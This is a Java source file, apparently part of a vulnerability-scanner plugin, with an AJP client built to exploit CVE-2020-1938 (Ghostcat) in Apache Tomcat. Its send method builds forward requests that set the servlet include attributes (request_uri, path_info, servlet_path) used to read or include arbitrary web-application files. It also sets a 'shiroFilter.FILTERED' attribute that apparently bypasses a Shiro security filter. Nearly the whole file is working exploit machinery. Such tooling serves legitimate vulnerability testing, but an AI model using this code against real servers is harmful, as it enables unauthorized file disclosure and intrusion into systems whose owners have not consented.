package me.gv7.woodpecker.vuldb.CVE_2020_1938.utils;

import com.github.jrialland.ajpclient.*;
import com.github.jrialland.ajpclient.pool.Channels;
import io.netty.channel.Channel;

import java.util.ArrayList;
import java.util.List;

public class AJPClient {
    private String host;
    private int port;
    private String uri;
    private String request_uri;
    private String path_info;
    private String servlet_path;
    private Channel channel;

    public AJPClient(String host,int port,String uri){
        this.host = host;
        this.port = port;
        this.uri = uri;
        this.channel = Channels.connect(host, port);
    }

    public void setRequest_uri(String request_uri) {
        this.request_uri = request_uri;
    }

    public void setPath_info(String path_info) {
        this.path_info = path_info;
    }

    public void setServlet_path(String servlet_path) {
        this.servlet_path = servlet_path;
    }

    public SimpleForwardResponse send() throws Exception {
        SimpleForwardRequest sfr = new SimpleForwardRequest();
        sfr.setRequestUri(this.uri);

        List<Attribute> a = new ArrayList<Attribute>();
        List<String> b = new ArrayList<String>();
        b.add("javax.servlet.include.request_uri");
        b.add(this.request_uri);
        a.add(new Attribute(AttributeType.REQ_ATTRIBUTE, b));
        sfr.setAttributes(a);

        b = new ArrayList<String>();
        b.add("javax.servlet.include.path_info");
        b.add(this.path_info);
        a.add(new Attribute(AttributeType.REQ_ATTRIBUTE, b));
        sfr.setAttributes(a);

        b = new ArrayList<String>();
        b.add("javax.servlet.include.servlet_path");
        b.add(this.servlet_path);
        a.add(new Attribute(AttributeType.REQ_ATTRIBUTE, b));
        sfr.setAttributes(a);

        b = new ArrayList<String>();
        b.add("shiroFilter.FILTERED");
        b.add("1");
        a.add(new Attribute(AttributeType.REQ_ATTRIBUTE, b));
        sfr.setAttributes(a);

        SimpleForwardResponse sfrr = new SimpleForwardResponse();
        new Forward(sfr, sfrr).execute(channel);
        return sfrr;
    }
}
